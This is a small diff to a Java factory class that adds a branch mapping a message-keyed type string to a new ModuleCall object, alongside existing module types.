@@ -54,6 +54,8 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 			a = new ModuleCrisis();
 		} else if (Messages.getString("c.12").equals(type)) { //$NON-NLS-1$
 			a = new ModuleApplication();
+		} else if (Messages.getString("c.13").equals(type)) { //$NON-NLS-1$
+			a = new ModuleCall();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
